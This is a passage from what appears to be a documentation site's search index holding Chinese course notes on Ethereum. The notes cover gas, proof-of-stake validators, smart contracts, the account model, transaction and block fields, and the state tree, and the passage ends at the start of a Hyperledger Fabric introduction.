gas\uff0c\u7528\u4e8e\u652f\u4ed8\u4ea4\u6613\u8d39\u7528\u548c\u8ba1\u7b97\u670d\u52a1\u3002\u4ee5\u592a\u5e01\u7684\u6700\u5c0f\u5355\u4f4d\u662f wei\uff08\u4e3a\u7eaa\u5ff5\u5bc6\u7801\u5b66\u5bb6 Wei Dai\uff09\uff0c\u5176\u6362\u7b97\u5173\u7cfb\u5982\u4e0b\uff1a</p> <p></p> <p>\u4ee5\u592a\u574a\u8fd8\u5141\u8bb8\u4f7f\u7528\u4ee3\u5e01\uff08NFT\uff09\uff0c\u8bb8\u591a\u5176\u5b83\u52a0\u5bc6\u8d27\u5e01\u5728\u4ee5\u592a\u574a\u4e0a\u4f7f\u7528 ERC-20 \u6807\u51c6\u53d1\u884c</p> <p>\u53e6\u5916\uff0c\u4ee5\u592a\u574a\u8fd8\u81f4\u529b\u4e8e\u79fb\u9664\u5148\u524d\u6bd4\u7279\u5e01\u91c7\u7528\u7684\u5de5\u4f5c\u91cf\u8bc1\u660e\u673a\u5236\uff08PoW\uff09\uff0c\u9010\u6e10\u8f6c\u5411\u66f4\u6709\u6548\u7387\u7684\u6743\u76ca\u8bc1\u660e\uff08PoS\uff09</p> <p>2022 \u5e74\u4e3b\u7f51\u548c PoS \u5171\u8bc6\u5c42\u4fe1\u6807\u94fe\u7ed3\u5408\uff0c\u5ba3\u5e03\u4ee5\u592a\u574a\u6b63\u5f0f\u8fdb\u5165 2.0 \u65f6\u4ee3\uff0c\u544a\u522b\u4e86\u5927\u89c4\u6a21\u6316\u77ff\u65f6\u4ee3</p> <p>\u5de5\u4f5c\u91cf\u8bc1\u660e\u867d\u7136\u4fdd\u8bc1\u4e86\u533a\u5757\u94fe\u7684\u5b89\u5168\uff0c\u4f46\u662f\u6d88\u8017\u7684\u8ba1\u7b97\u8d44\u6e90\u592a\u591a\u3002\u56e0\u6b64\uff0c\u4ee5\u592a\u574a\u5728 2022 \u5e74\u7ec8\u7ed3\u4e86\u5de5\u4f5c\u91cf\u8bc1\u660e\u673a\u5236\uff0c\u5e76\u5f00\u59cb\u91c7\u7528\u6743\u76ca\u8bc1\u660e\uff0c\u5728\u6743\u76ca\u8bc1\u660e\u673a\u5236\u4e0b\uff0c\u4ee5\u592a\u574a\u4ea4\u6613\u6267\u884c\u8fc7\u7a0b\u662f\u8fd9\u6837\u7684\uff1a</p> <p>\u9996\u5148\uff0c\u7528\u6237\u9700\u8981\u5c06\u4e00\u5b9a\u6570\u91cf\u7684\u4ee5\u592a\u5e01\uff08\u81f3\u5c11 32 ETH\uff09\u8d28\u62bc\u5230\u7f51\u7edc\u4e2d\u7684\u667a\u80fd\u5408\u7ea6\u4e2d\uff0c\u6210\u4e3a\u9a8c\u8bc1\u8005\u3002\u8fd9\u4e9b\u8d28\u62bc\u7684\u4ee3\u5e01\u4f5c\u4e3a\u62b5\u62bc\u54c1\uff0c\u786e\u4fdd\u9a8c\u8bc1\u8005\u7684\u884c\u4e3a\u7b26\u5408\u7f51\u7edc\u89c4\u5219\u3002\u591a\u4e2a\u9a8c\u8bc1\u8005\u5171\u540c\u7ec4\u6210\u9a8c\u8bc1\u8005\u59d4\u5458\u4f1a\uff0c\u53c2\u4e0e\u7f51\u7edc\u7684\u5171\u8bc6\u8fc7\u7a0b\u3002</p> <p>\u5728\u6bcf\u4e2a\u533a\u5757\u5468\u671f\u5185\uff0c\u7cfb\u7edf\u4f1a\u968f\u673a\u9009\u62e9\u4e00\u4f4d\u9a8c\u8bc1\u8005\u4f5c\u4e3a\u533a\u5757\u63d0\u8bae\u8005\u3002\u8be5\u9a8c\u8bc1\u8005\u8d1f\u8d23\u521b\u5efa\u65b0\u533a\u5757\uff0c\u5e76\u5c06\u65b0\u533a\u5757\u53d1\u9001\u7ed9\u7f51\u7edc\u4e0a\u7684\u5176\u4ed6\u8282\u70b9\u8fdb\u884c\u9a8c\u8bc1\u3002\u8fd9\u4e2a\u968f\u673a\u9009\u62e9\u9a8c\u8bc1\u8005\u7684\u8fc7\u7a0b\u786e\u4fdd\u4e86\u7f51\u7edc\u7684\u53bb\u4e2d\u5fc3\u5316\u548c\u5b89\u5168\u6027\u3002</p> <p>\u6b64\u5904\u7684\u968f\u673a\u65f6\u4f2a\u968f\u673a\uff0c\u62b5\u62bc\u7684\u4ee3\u5e01\u8d8a\u591a\uff0c\u79f0\u4e3a\u533a\u5757\u63d0\u8bae\u8005\u7684\u6982\u7387\u8d8a\u5927</p> <p>\u65b0\u533a\u5757\u751f\u6210\u540e\uff0c\u5176\u4ed6\u9a8c\u8bc1\u8005\u4f1a\u9a8c\u8bc1\u533a\u5757\u4e2d\u7684\u4ea4\u6613\u6b63\u786e\u6027\u3002\u4ed6\u4eec\u68c0\u67e5\u4ea4\u6613\u7684\u7b7e\u540d\u3001\u4f59\u989d\u3001Gas\u8d39\u7528\u7b49\uff0c\u786e\u4fdd\u6240\u6709\u4ea4\u6613\u90fd\u7b26\u5408\u7f51\u7edc\u89c4\u5219\u3002\u53ea\u6709\u7ecf\u8fc7\u9a8c\u8bc1\u7684\u4ea4\u6613\u624d\u4f1a\u88ab\u5305\u542b\u5728\u533a\u5757\u4e2d\uff0c\u4ece\u800c\u786e\u4fdd\u533a\u5757\u94fe\u7684\u6570\u636e\u5b8c\u6574\u6027\u548c\u4e00\u81f4\u6027\u3002</p> <p>\u5f53\u9a8c\u8bc1\u8005\u63d0\u8bae\u533a\u5757\u6216\u8005\u53c2\u4e0e\u9a8c\u8bc1\u65f6\uff0c\u5982\u679c\u4ed6\u4eec\u7684\u6295\u7968\u4e0e\u5927\u591a\u6570\u5176\u4ed6\u9a8c\u8bc1\u8005\u4e00\u81f4\uff0c\u4ed6\u4eec\u4f1a\u83b7\u5f97\u5956\u52b1\u3002\u76f8\u53cd\uff0c\u5982\u679c\u9a8c\u8bc1\u8005\u884c\u4e3a\u4e0d\u5f53\uff0c\u5982\u53cc\u7b7e\u6216\u63d0\u8bae\u65e0\u6548\u533a\u5757\uff0c\u4ed6\u4eec\u7684\u8d28\u62bc\u8d44\u91d1\u4f1a\u88ab\u6ca1\u6536\uff0c\u4ee5\u7ef4\u62a4\u7f51\u7edc\u7684\u5b89\u5168\u6027\u3002</p> <p>\u8d28\u62bc\u65f6\u4ee3\u7684\u5171\u8bc6\u5956\u52b1\u5305\u62ec\u8d28\u62bc\u5956\u52b1\u3001\u6cb9\u8d39\u5c0f\u8d39\u3001MEV\u6536\u76ca\uff1a</p> <p>TODO: \u6743\u76ca\u8bc1\u660e\u5177\u4f53</p>"},{"location":"Courses/Blockchain/eth/#_3","title":"\u667a\u80fd\u5408\u7ea6","text":"<p>\u667a\u80fd\u5408\u7ea6\u662f\u4ee5\u592a\u574a\u6700\u91cd\u8981\u7684\u6280\u672f\u8d21\u732e\uff0c\u5b83\u662f\u5b58\u50a8\u5728\u533a\u5757\u94fe\u4e0a\u7684\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u534f\u52a9\u548c\u9a8c\u8bc1\u5408\u7ea6\u7684\u8c08\u5224\u548c\u6267\u884c\u3002\u667a\u80fd\u5408\u7ea6\u53ef\u4ee5\u901a\u8fc7\u6570\u79cd\u56fe\u7075\u5b8c\u5907\u7684\u7f16\u7a0b\u8bed\u8a00\u7f16\u5199\uff0c\u5b83\u4f1a\u88ab\u7f16\u8bd1\u6210\u5b57\u8282\u7801\u53d1\u5e03\u5728\u533a\u5757\u94fe\u4e0a\u3002</p> <p>\u56e0\u4e3a\u5408\u7ea6\u5185\u5bb9\u4ee3\u7801\u5747\u516c\u5f00\uff0c\u56e0\u6b64\u5408\u7ea6\u53ef\u4ee5\u8bc1\u660e\u5176\u5ba3\u79f0\u7684\u529f\u80fd\u662f\u771f\u5b9e\u7684\uff1b\u53e6\u4e00\u65b9\u9762\uff0c\u5408\u7ea6\u7684\u516c\u5f00\u6027\u4e5f\u8ba9\u5408\u7ea6\u4e2d\u7684\u6f0f\u6d1e\u53ef\u4ee5\u88ab\u4efb\u4f55\u4eba\u770b\u5230\u3002</p>"},{"location":"Courses/Blockchain/eth/#_4","title":"\u4ee5\u592a\u574a\u8d26\u6237\u6a21\u578b","text":"<p>\u4e0d\u540c\u4e8e\u6bd4\u7279\u5e01\u91c7\u7528 UTXO \u6a21\u578b\u8bb0\u5f55\u4ea4\u6613\u5386\u53f2\uff0c\u4ee5\u592a\u574a\u7528\u8d26\u6237\u8bb0\u5f55\u7cfb\u7edf\u5f53\u524d\u72b6\u6001\uff0c\u5305\u62ec\u8d26\u6237\u4f59\u989d\u4fe1\u606f\u3001\u667a\u80fd\u5408\u7ea6\u4ee3\u7801\u3001\u6bcf\u4e2a\u5408\u7ea6\u7684\u72b6\u6001\u53d8\u91cf\u7b49\u3002</p> <p>\u4ee5\u592a\u574a\u8d26\u6237\u662f\u53c2\u4e0e\u4ee5\u592a\u574a\u7f51\u7edc\u6d3b\u52a8\u7684\u57fa\u672c\u5b9e\u4f53\uff0c\u5bf9\u4ee5\u592a\u574a\u72b6\u6001\u7684\u6539\u53d8\u90fd\u9700\u8981\u901a\u8fc7\u8d26\u6237\u6765\u6267\u884c\u3002\u4ee5\u592a\u574a\u8d26\u6237\u7c7b\u578b\u5206\u4e3a\u5916\u90e8\u8d26\u6237\u548c\u5408\u7ea6\u8d26\u6237\uff0c\u5176\u4e2d\u5916\u90e8\u8d26\u6237\u76f8\u5f53\u4e8e\u7528\u6237\uff0c\u800c\u5408\u7ea6\u8d26\u6237\u5b58\u50a8\u4e86\u5408\u7ea6\u4ee3\u7801\uff0c\u53ea\u80fd\u88ab\u5916\u90e8\u8d26\u6237\u8c03\u7528\u6fc0\u6d3b\u3002</p> <p></p> <p>\u4e0d\u7ba1\u662f\u5916\u90e8\u8d26\u6237\u8fd8\u662f\u5408\u7ea6\u8d26\u6237\uff0c\u5b83\u4eec\u90fd\u5177\u6709\u56db\u4e2a\u5c5e\u6027\uff0c\u53ea\u4e0d\u8fc7\u6709\u4e9b\u5c5e\u6027\u53ef\u4ee5\u7f6e\u7a7a\u6216\u7279\u6b8a\u503c\uff1a</p> <ul> <li>nonce: \u5bf9\u4e8e\u5916\u90e8\u8d26\u6237\uff0c\u8868\u793a\u5df2\u53d1\u9001\u7684\u4ea4\u6613\u6570\u91cf\uff1b\u5bf9\u4e8e\u5408\u7ea6\u8d26\u6237\uff0c\u8868\u793a\u5df2\u521b\u5efa\u7684\u5408\u7ea6\u6570\u91cf</li> <li>balance: \u4f59\u989d\uff0c\u4e0d\u7ba1\u662f\u5916\u90e8\u8d26\u6237\u8fd8\u662f\u5408\u7ea6\u8d26\u6237\u90fd\u6709\u4f59\u989d</li> <li>strorageRoot: \u5b58\u50a8\u5408\u7ea6\u8d26\u6237\u667a\u80fd\u5408\u7ea6\u72b6\u6001\u6811\u7684\u6839\uff0c\u5916\u90e8\u8d26\u6237\u4e2d\u8be5\u503c\u4e3a\u7a7a</li> <li>codeHash: \u5bf9\u4e8e\u5916\u90e8\u8d26\u6237\uff0c\u4e3a\u5bf9\u7a7a\u4e32\u7684\u54c8\u5e0c\u503c\uff1b\u5bf9\u4e8e\u5408\u7ea6\u8d26\u6237\uff0c\u4e3a\u5bf9\u5408\u7ea6\u4ee3\u7801\u7684\u54c8\u5e0c\u503c</li> </ul> <p>\u56e0\u6b64\uff0c\u5bf9\u4e8e\u5916\u90e8\u8d26\u6237\uff0c\u6709\u6548\u4fe1\u606f\u4e3a\u53d1\u9001\u7684\u4ea4\u6613\u6570 + \u4f59\u989d</p> <p>\u5916\u90e8\u8d26\u6237\u7531\u79c1\u94a5\u6765\u63a7\u5236\uff0c\u6bcf\u4e00\u4e2a\u5916\u90e8\u8d26\u6237\u90fd\u62e5\u6709\u4e00\u5bf9\u516c\u79c1\u94a5\uff08\u91c7\u7528\u7684 ECC \u7b97\u6cd5\uff09\uff0c\u7528\u4e8e\u7b7e\u7f72\u4ea4\u6613\u3002\u8d26\u6237\u5730\u5740\u901a\u5e38\u7531\u516c\u94a5\u901a\u8fc7\u4e00\u7cfb\u5217\u7b97\u6cd5\u8ba1\u7b97\u3002</p> \u4ee5\u592a\u574a\u5730\u5740\u8ba1\u7b97\u6d41\u7a0b <p></p> <p>\u5408\u7ea6\u8d26\u6237\u662f\u7531\u5916\u90e8\u8d26\u6237\u521b\u5efa\u7684\u5305\u542b\u5408\u7ea6\u4ee3\u7801\u7684\u8d26\u6237\uff0c\u5176\u4e0d\u662f\u7531\u79c1\u94a5\u63a7\u5236\uff0c\u800c\u662f\u7531\u5408\u7ea6\u4ee3\u7801\u63a7\u5236\u3002\u5408\u7ea6\u8d26\u6237\u7684\u5730\u5740\u662f\u7531\u5408\u7ea6\u521b\u5efa\u65f6\u5408\u7ea6\u521b\u5efa\u8005\u7684\u5730\u5740\u4ee5\u53ca\u8be5\u5730\u5740\u53d1\u51fa\u7684\u4ea4\u6613\u5171\u540c\u8ba1\u7b97\u51fa\u6765\u7684\u3002</p> <p>\u5408\u7ea6\u8d26\u6237\u4e5f\u62e5\u6709\u4e00\u5b9a\u4ee5\u592a\u5e01\u4f59\u989d\uff0c\u8fd9\u4f7f\u5f97\u5408\u7ea6\u53ef\u4ee5\u6210\u4e3a\u8d44\u91d1\u6c60\uff0c\u5e38\u5728\u91d1\u878d\u7b49\u76f8\u5173\u9886\u57df\u4e2d\u5e94\u7528\u3002\u5408\u7ea6\u88ab\u6267\u884c\u65f6\uff0c\u53ea\u80fd\u64cd\u4f5c\u5408\u7ea6\u8d26\u6237\u62e5\u6709\u7684\u7279\u5b9a\u5b58\u50a8\uff08\u4e3b\u8981\u662f\u5b58\u50a8\u5408\u7ea6\u5404\u72b6\u6001\u53d8\u91cf\u7684\u503c\uff09\u3002</p> <p>\u6bcf\u5f53\u5408\u7ea6\u8d26\u6237\u6536\u5230\u4e00\u6761\u4ea4\u6613\u6d88\u606f\u65f6\uff0c\u5176\u5408\u7ea6\u4ee3\u7801\u5c06\u88ab\u4ea4\u6613\u8f93\u5165\u7684\u53c2\u6570\u8c03\u7528\u6267\u884c\u3002\u800c\u5408\u7ea6\u4ee3\u7801\u5c06\u4f1a\u5728\u53c2\u4e0e\u5230\u7f51\u7edc\u7684\u6bcf\u4e00\u4e2a\u8282\u70b9\u4e0a\u6267\u884c\uff0c\u6267\u884c\u7ed3\u679c\u5c06\u4f5c\u4e3a\u65b0\u5757\u9a8c\u8bc1\u7684\u4e00\u90e8\u5206\u3002</p> <p>\u53ef\u4ee5\u8ba4\u4e3a\u5408\u7ea6\u53d1\u5e03\u5728\u533a\u5757\u94fe\u5c31\u662f\u751f\u6210\u4e00\u4e2a\u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u7528\u6237\u4f1a\u5f97\u5230\u5408\u7ea6\u8d26\u6237\u7684\u5730\u5740\uff0c\u76f8\u5f53\u4e8e\u5bf9\u8c61\u7684\u6307\u9488</p>"},{"location":"Courses/Blockchain/eth/#_5","title":"\u4ee5\u592a\u574a\u4ea4\u6613","text":"<p>\u4ea4\u6613\uff08Transaction\uff09\u662f\u7531\u8d26\u6237\u53d1\u51fa\uff0c\u5e26\u7b7e\u540d\u7684\u6d88\u606f\u3002\u4ea4\u6613\u7c7b\u578b\u53ef\u5206\u4e3a\u4e09\u7c7b\uff1a</p> <ul> <li>\u8f6c\u8d26: \u5c06\u4e00\u5b9a\u6570\u91cf\u4ee5\u592a\u5e01\u53d1\u9001\u5230\u53e6\u4e00\u4e2a\u5916\u90e8\u8d26\u6237\u6216\u5408\u7ea6\u8d26\u6237</li> <li>\u521b\u5efa\u5408\u7ea6: \u5c06\u5408\u7ea6\u4ee3\u7801\u90e8\u7f72\u5230\u4ee5\u592a\u574a\u533a\u5757\u94fe\u4e0a\uff0c\u751f\u6210\u65b0\u7684\u5408\u7ea6\u8d26\u6237</li> <li>\u8c03\u7528\u5408\u7ea6: \u5bf9\u5df2\u90e8\u7f72\u7684\u5408\u7ea6\u4ee3\u7801\u4e2d\u7684\u51fd\u6570\u8fdb\u884c\u8c03\u7528\uff0c\u4ee5\u6267\u884c\u5408\u7ea6\u4e2d\u7684\u7279\u5b9a\u903b\u8f91</li> </ul> <p></p> <ul> <li>nonce: \u76f8\u5f53\u4e8e\u8ba1\u6570\u5668\uff0c\u4e00\u4e2a\u8d26\u6237\u53ef\u4ee5\u53d1\u8d77\u591a\u7b14\u4ea4\u6613\uff0c\u4e3a\u4e86\u9632\u6b62\u91cd\u653e\u653b\u51fb\uff0c\u4ee5\u592a\u574a\u4f7f\u7528\u8be5\u5b57\u6bb5\u552f\u4e00\u6807\u8bc6\u548c\u6392\u5e8f\u8fd9\u4e9b\u4ea4\u6613</li> <li>gasPrice: gas \u7684\u5355\u4ef7\uff0c\u5373\u6bcf\u4e2a\u57fa\u672c\u64cd\u4f5c\u7684\u4ef7\u683c\uff0c\u4ee5 wei \u4e3a\u5355\u4f4d<ul> <li>\u8be5\u5b57\u6bb5\u7684\u503c\u89c6\u5f53\u65f6\u533a\u5757\u94fe\u62e5\u5835\u60c5\u51b5\u800c\u5b9a\uff0c\u66f4\u9ad8\u7684 GasPrice \u66f4\u5bb9\u6613\u88ab\u6253\u5305</li> <li>\u5b9e\u9645\u6d88\u8017\u7684\u8d39\u7528\u4e3a gasPrice * gasUsed</li> <li>\u5176\u4e2d\u8f6c\u8d26\u4ea4\u6613\u7684\u6d88\u8017\u56fa\u5b9a\u4e3a 21000 Gas\uff0c\u5176\u5b83\u64cd\u4f5c\u89c6\u5408\u7ea6\u4ee3\u7801\u800c\u5b9a</li> </ul> </li> <li>gasLimit: \u4ea4\u6613\u53d1\u8d77\u8005\u613f\u610f\u4e3a\u6267\u884c\u8be5\u7b14\u4ea4\u6613\u652f\u4ed8\u7684\u6700\u5927 Gas \u4e0a\u9650<ul> <li>\u7528\u6237\u53d1\u8d77\u4ea4\u6613\u8981\u9884\u5148\u652f\u4ed8 gasPrice * gasLimit \u8d39\u7528\uff0c\u4ea4\u6613\u6253\u5305\u540e\u591a\u7ed9\u7684\u90e8\u5206\u4f1a\u9000\u8fd8</li> <li>\u5982\u679c\u8fbe\u5230\u4e86 gasLimit \u4e0a\u9650\u4ecd\u672a\u6267\u884c\u5b8c\uff0c\u8be5\u8d39\u7528\u4e0d\u4f1a\u9000\u8fd8</li> </ul> </li> <li>from: \u53d1\u9001\u4ea4\u6613\u7684\u5730\u5740</li> <li>to: \u4ea4\u6613\u7684\u76ee\u6807\u5730\u5740<ul> <li>\u8be5\u5b57\u6bb5\u4e3a\u7a7a\u5219\u662f\u521b\u5efa\u5408\u7ea6</li> <li>\u8be5\u5b57\u6bb5\u4e3a\u5408\u7ea6\u5730\u5740\u5219\u662f\u8c03\u7528\u5408\u7ea6\u63a5\u53e3</li> <li>\u8be5\u5b57\u6bb5\u4e3a\u666e\u901a\u5730\u5740\u5219\u662f\u4ee5\u592a\u574a\u4ea4\u6613\u8f6c\u8d26</li> </ul> </li> <li>value: \u8f6c\u8d26\u91d1\u989d\uff0c\u4ee5 wei \u4e3a\u5355\u4f4d</li> <li>data: \u4f20\u9012\u6570\u636e\uff0c\u53ef\u4e3a\u7a7a<ul> <li>\u8c03\u7528\u5408\u7ea6\u65f6\uff0c\u4e3a\u53c2\u6570</li> <li>\u521b\u5efa\u5408\u7ea6\u65f6\uff0c\u4e3a\u5408\u7ea6\u7684\u5b57\u8282\u7801</li> </ul> </li> <li>\u7b7e\u540d: \u53d1\u9001\u65b9\u7684\u7b7e\u540d</li> </ul> <p>\u4ee5\u592a\u574a\u533a\u5757\u4f1a\u4e3a\u6bcf\u4e00\u7b14\u4ea4\u6613\u90fd\u4ea7\u751f\u4e00\u7b14\u56de\u6267\uff08Recipt\uff09\uff0c\u8868\u793a\u4ea4\u6613\u7684\u6700\u7ec8\u72b6\u6001\u3002\u4e00\u4e2a\u56de\u6267\u4fe1\u606f\u4e3b\u8981\u5305\u62ec\uff1a</p> <ul> <li>status: \u6267\u884c\u7ed3\u679c\uff0c1 \u8868\u793a\u6210\u529f\uff0c0 \u8868\u793a\u5931\u8d25</li> <li>gasUsed: \u5df2\u6d88\u8017\u7684 Gas \u6570\u91cf</li> <li>txHash: \u4ea4\u6613\u54c8\u5e0c</li> <li>logs: \u4ea4\u6613\u4ea7\u751f\u7684\u65e5\u5fd7</li> <li>...</li> </ul>"},{"location":"Courses/Blockchain/eth/#_6","title":"\u4ee5\u592a\u574a\u533a\u5757","text":"<p>\u4ea4\u6613\u88ab\u6253\u5305\u8fdb\u533a\u5757\u4e2d\uff0c\u5e76\u6309\u7167\u65f6\u95f4\u987a\u5e8f\u5f62\u6210\u4e00\u6761\u533a\u5757\u94fe\u3002\u533a\u5757\u7531\u533a\u5757\u5934\u548c\u533a\u5757\u4f53\u7ec4\u6210\uff0c\u5176\u4e2d\u533a\u5757\u4f53\u4e2d\u4e3b\u8981\u662f\u4ea4\u6613\u5217\u8868\uff0c\u800c\u533a\u5757\u5934\u5b58\u50a8\u533a\u5757\u7684\u5143\u4fe1\u606f\uff0c\u7528\u4e8e\u5bf9\u533a\u5757\u5185\u5bb9\u8fdb\u884c\u4e00\u4e9b\u6807\u8bc6\u3001\u6821\u9a8c\u548c\u8bf4\u660e\u7b49\uff0c\u5177\u4f53\u5b57\u6bb5\u5305\u62ec\uff1a</p> <ul> <li>ParentHash: \u7236\u533a\u5757\u54c8\u5e0c\u503c</li> <li>UncleHash: \u53d4\u5757\u5217\u8868\u7684\u54c8\u5e0c\u503c</li> <li>Coinbase: \u6253\u5305\u8005\u5730\u5740</li> <li>Root: \u72b6\u6001\u6570\u6839\u8282\u70b9\u54c8\u5e0c</li> <li>TxHash: \u4ea4\u6613\u6811\u6839\u8282\u70b9\u54c8\u5e0c</li> <li>ReceiptHash: \u4ea4\u6613\u6536\u636e\u6811\u6839\u8282\u70b9\u54c8\u5e0c</li> <li>Bloom: Bloom \u65e5\u5fd7\u8fc7\u6ee4\u5668\uff0c\u7528\u6765\u52a0\u901f\u4ea4\u6613\u4fe1\u606f\u67e5\u627e</li> <li>Number: \u533a\u5757\u53f7</li> <li>GasLimit: \u533a\u5757\u5185\u6240\u6709 gas \u6d88\u8017\u4e0a\u9650</li> <li>GasUsed: \u533a\u5757\u5185\u6240\u6709\u4ea4\u6613\u6267\u884c\u6d88\u8017 gas \u7684\u603b\u548c</li> <li>Time: \u533a\u5757\u65f6\u95f4\u6233</li> <li>Extra: \u9644\u52a0\u6570\u636e</li> <li>Difficulty*: \u533a\u5757\u96be\u5ea6</li> <li>MixDigest*: \u5de5\u4f5c\u91cf\u8bc1\u660e\u54c8\u5e0c\u503c</li> <li>Nonce*: \u5de5\u4f5c\u91cf\u8bc1\u660e\u4e2d\u7684\u968f\u673a\u6570</li> </ul> <p>\u5bf9\u4e8e PoS\uff0c\u4e0a\u9762\u4e09\u4e2a\u661f\u6807\u90fd\u53ef\u4ee5\u4e3a\u7a7a</p> <p>\u66f4\u8fdb\u4e00\u6b65\u6765\u8bf4\uff0c\u5bf9\u4e8e\u975e\u516c\u94fe\u573a\u666f\uff08\u5982\u8054\u76df\u94fe\uff09\uff0cCoinbase\u3001Difficulty\u3001GasLimit\u3001GasUsed\u3001MixDigest\u3001Nonce\u3001Uncle \u53ef\u80fd\u90fd\u4e0d\u9700\u8981\uff1b\u5176\u5b83\u7684\u5b57\u6bb5\u89c6\u94fe\u7684\u8bbe\u8ba1\u4e5f\u4e0d\u4e00\u5b9a\u5b58\u5728\u3002</p> <p>\u4e16\u754c\u72b6\u6001\u662f\u5730\u5740\uff08\u8d26\u6237\uff09\u5230\u8d26\u6237\u72b6\u6001\u7684\u6620\u5c04\uff0c\u5b83\u5e76\u4e0d\u76f4\u63a5\u4fdd\u5b58\u5728\u533a\u5757\u94fe\u4e0a\uff0c\u533a\u5757\u5934\u4e2d\u53ea\u5b58\u50a8\u4e86\u4e16\u754c\u72b6\u6001\u7684\u6839\uff0c\u5373\u4e0a\u9762\u8bf4\u7684\u5b57\u6bb5 Root\u3002</p> <p>\u4e16\u754c\u72b6\u6001\u4f7f\u7528\u6811\u4f5c\u4e3a\u6570\u636e\u7ed3\u6784\uff0c\u6b64\u6811\u4e5f\u88ab\u79f0\u4e3a\u72b6\u6001\u6570\u636e\u5e93\u6216\u72b6\u6001\u6811\u3002\u4e16\u754c\u72b6\u6001\u4f1a\u968f\u7740\u4ea4\u6613\u7684\u6267\u884c\u800c\u6301\u7eed\u66f4\u65b0\u3002</p> <p></p> <p>\u5177\u4f53\u800c\u8a00\uff0c\u4ee5\u592a\u574a\u5b58\u50a8\u8d26\u6237\u6570\u636e\u7684\u6570\u636e\u7ed3\u6784\u4e3a\u5e15\u7279\u91cc\u590f\u6811(Merkle Patricia Tree, MPT)\uff0c\u8fd9\u662f\u4e00\u79cd\u6539\u8fdb\u7684 Merkle Tree\uff0c\u5c5e\u4e8e\u538b\u7f29\u524d\u7f00\u6811\u3002</p> <p>\u4ece\u5168\u5c40\u6765\u770b\uff0c\u4ee5\u592a\u574a\u5c31\u662f\u4e00\u4e2a\u72b6\u6001\u673a\uff0c\u6bcf\u5f53\u6709\u8d26\u6237\u72b6\u6001\u6539\u53d8\u65f6\uff0c\u5176\u5bf9\u5e94\u7684 Root \u4e5f\u4f1a\u6539\u53d8\uff0c\u56e0\u6b64\uff0cRoot \u88ab\u79f0\u4e3a\u5f53\u524d\u7684\u4e16\u754c\u72b6\u6001\u3002\u6bcf\u4e2a\u533a\u5757\u5934\u4e2d\u7684 Root \u90fd\u8868\u793a\u4e86\u4e00\u4e2a\u5b8c\u5168\u72b6\u6001\u7684\u903b\u8f91\u6811\uff0c\u4f46\u6bcf\u4e2a\u533a\u5757\u4ea4\u6613\u4f53\u4e2d\u8bb0\u5f55\u7684\u6570\u636e\u53ea\u5305\u62ec\u4fee\u6539\u7684\u90e8\u5206\uff0c\u5982\u6b64\u4fdd\u8bc1\u533a\u5757\u7684\u6570\u636e\u91cf\u4e0d\u4f1a\u8d8a\u5806\u8d8a\u5927\u3002</p> <p>\u4f8b\u5982\u533a\u5757\u5185\u53ea\u6709\u4e00\u7b14\u8f6c\u8d26\uff0c\u90a3\u8fd9\u4e2a\u533a\u5757\u53ea\u8bb0\u5f55\u4fee\u6539\u7684\u4e24\u4e2a\u8d26\u6237\uff0c\u4ee5\u53ca\u4e24\u4e2a\u8d26\u6237\u56e0\u4fee\u6539\u540e\u5bfc\u81f4\u7684\u4e0a\u5c42\u8def\u5f84\u54c8\u5e0c\u503c\u53d8\u5316</p>"},{"location":"Courses/Blockchain/eth/#_7","title":"\u5e94\u7528","text":"<ul> <li>Top Ethereum DeFi Apps | DappRadar</li> <li>Ethereum (ETH) Blockchain Explorer</li> <li>Remix - Ethereum IDE</li> <li> </li></ul> <p>DeFi, \u5ba2\u6237\u7aef\u8f6f\u4ef6(Geth, Parity), \u6e38\u620f\uff0c\u4f01\u4e1a\u8f6f\u4ef6...</p> <p>\u8de8\u5883\u652f\u4ed8\u3001\u4f9b\u5e94\u94fe\u7ba1\u7406\u3001\u533b\u7597\u4fdd\u5065\u3001\u9884\u4ed8\u8d39\u5361...</p>"},{"location":"Courses/Blockchain/fabric/","title":"\u8d85\u7ea7\u8d26\u672c","text":""},{"location":"Courses/Blockchain/fabric/#_1","title":"\u8d85\u7ea7\u8d26\u672c","text":"<p> \u7ea6 536 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>\u8d85\u7ea7\u8d26\u672c\u6280\u672f\u6574\u4f53\u67b6\u6784</p> <p></p>"},{"location":"Courses/Blockchain/fabric/#introduction","title":"Introduction","text":"<p>\u8d85\u7ea7\u8d26\u672c\u662f\u4e00\u4e2a Linux \u57fa\u91d1\u4f1a\u53d1\u8d77\u7684\u5f00\u6e90\u9879\u76ee\uff0c\u662f\u5404\u79cd\u5206\u5e03\u5f0f\u8d26\u672c\u6280\u672f\u7684\u7ec4\u5408\uff0c\u7740\u529b\u4e8e\u5f00\u53d1\u4e00\u5957\u7a33\u5b9a\u7684\u6846\u67b6\uff0c\u5de5\u5177\u548c\u7a0b\u5e8f\u5e93\uff0c\u7528\u4e8e\u4f01\u4e1a\u7ea7\u533a\u5757\u94fe\u90e8\u7f72\u3002</p> <p>Hyperledger Fabric \u662f\u7531 IBM \u516c\u53f8\u4e3b\u5bfc\u5f00\u53d1\u7684\u5206\u5e03\u5f0f\u8d26\u672c\u6280\u672f\uff0c\u5b83\u662f\u5efa\u7acb\u5728 Fabric \u7f51\u7edc\u57fa\u7840\u4e0a\u7684\u8054\u76df\u533a\u5757\u94fe\u5e73\u53f0\u3002\u4e0e\u6bd4\u7279\u5e01\u548c\u4ee5\u592a\u574a\u8fd9\u7c7b\u516c\u6709\u94fe\u4e0d\u540c\uff0c\u8054\u76df\u94fe\u6240\u6709\u8282\u70b9\u5fc5\u987b\u6388\u6743\u8ba4\u8bc1\u540e\u624d\u80fd\u52a0\u5165\uff0c\u4ece\u800c\u907f\u514d PoW \u8d44\u6e90\u5f00\u9500\uff0c\u5927\u5e45\u63d0\u9ad8\u4ea4\u6613\u5904\u7406\u6548\u7387\uff0c\u6ee1\u8db3\u4f01\u4e1a\u7ea7\u5e94\u7528\u5bf9\u5904\u7406\u6027\u80fd\u7684\u8bc9\u6c42\u3002</p> <p>\u8282\u70b9 (peer) \u662f\u533a\u5757\u94fe\u7684\u901a\u4fe1\u5b9e\u4f53\uff0c\u662f\u4e00\u4e2a\u903b\u8f91\u6982\u5ff5\u3002\u5728\u6bd4\u7279\u5e01\u548c\u4ee5\u592a\u574a\u4e2d\uff0c\u6240\u6709\u8282\u70b9\u662f\u7b49\u4ef7\u7684\u3002Fabric 